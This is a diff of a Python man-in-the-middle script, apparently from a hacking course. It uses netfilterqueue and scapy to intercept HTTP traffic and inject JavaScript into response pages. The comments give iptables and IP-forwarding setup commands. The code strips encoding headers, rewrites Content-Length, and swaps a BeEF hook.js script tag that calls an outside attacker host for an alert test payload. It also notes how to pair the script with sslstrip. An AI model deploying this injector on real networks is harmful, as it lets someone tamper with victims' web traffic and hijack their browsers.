@@ -2,7 +2,7 @@
 # Description: This program inject code in http pages.
 #
 # Install Beef if neeeded (beef, toor) and use a webserver.
-# sudo pip install netfilterqueue               --> Install netfilterqueue
+# sudo pip install netfilterqueue               --> Install netfilterqueue.
 # echo 1 > /proc/sys/net/ipv4/ip_forward        --> Ip forwarding for mitm.
 # iptables -I FORWARD -j NFQUEUE --queue-num 0  --> For mitm. Trap all the packets that usually goes to the forward chain if it is are in the netfilter queue with queue number 0.
 # iptables -I OUTPUT -j NFQUEUE --queue-num 0   --> Use this and the next command instead if we are testing it in our own computer.
@@ -15,6 +15,7 @@
 import netfilterqueue
 import scapy.all as scapy
 import re
+import sys
 
 
 def set_load(packet, load):
@@ -27,7 +28,7 @@ def set_load(packet, load):
 def process_packet(packet):
     # Converting packet to a scapy packet
     scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.Raw):      
+    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:      
         # try:                                               python3 
             # load = scapy_packet[scapy.Raw].load.decode()   python3 
             load = scapy_packet[scapy.Raw].load  
@@ -35,9 +36,12 @@ def process_packet(packet):
                 print("[+] Request")
                 # Delete Accept-Encoding and its content to get it in plain text
                 load = re.sub("Accept-Encoding:.*?\\r\\n","", load)
+                # Remove comment if using this with sslstrip
+                #load = load.replace("HTTP/1.1", "HTTP/1.0")
             elif scapy_packet[scapy.TCP].sport == 80:
                 print("[+] Response")
-                injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'            
+                #injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'       
+                injection_code = '<script>alert("test")</script>'     
                 load = load.replace("</head>", injection_code + "</head>")
                 # The new load make its content-length bigger so we need to change it
                 content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
